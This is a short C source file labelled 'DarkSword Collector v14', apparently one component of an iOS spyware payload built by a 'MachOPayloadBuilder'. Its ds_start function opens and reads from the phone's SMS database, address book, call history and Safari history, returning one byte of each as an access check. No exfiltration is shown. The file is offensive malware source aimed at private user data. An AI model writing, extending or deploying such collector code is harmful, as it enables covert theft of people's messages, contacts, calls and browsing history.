/**
 * DarkSword Collector v14 - libc file I/O via PLT
 * Uses standard open/read/close (resolved by MachOPayloadBuilder)
 * Stack-only, no globals
 */
#include <fcntl.h>
#include <unistd.h>

static unsigned char _read_first_byte(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    unsigned char buf[4];
    int n = read(fd, buf, 4);
    close(fd);
    if (n < 1) return 0;
    return buf[0];
}

int ds_start(void) {
    unsigned char sms = _read_first_byte("/var/mobile/Library/SMS/sms.db");
    unsigned char contacts = _read_first_byte("/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
    unsigned char calls = _read_first_byte("/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
    unsigned char safari = _read_first_byte("/var/mobile/Library/Safari/History.db");

    return (int)sms | ((int)contacts << 8) | ((int)calls << 16) | ((int)safari << 24);
}
